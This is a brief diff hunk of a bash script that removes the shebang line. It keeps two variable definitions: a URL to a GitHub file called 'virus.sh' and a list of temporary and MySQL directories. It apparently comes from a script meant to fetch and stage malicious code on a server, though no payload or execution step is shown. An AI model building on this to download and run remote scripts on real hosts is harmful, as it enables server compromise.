@@ -1,6 +1,3 @@
-
-#!/bin/bash
-
 GITHUB_SCRIPT_URL="https://github.com/Zend1X/virus/blob/main/virus.sh"
 MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")
 
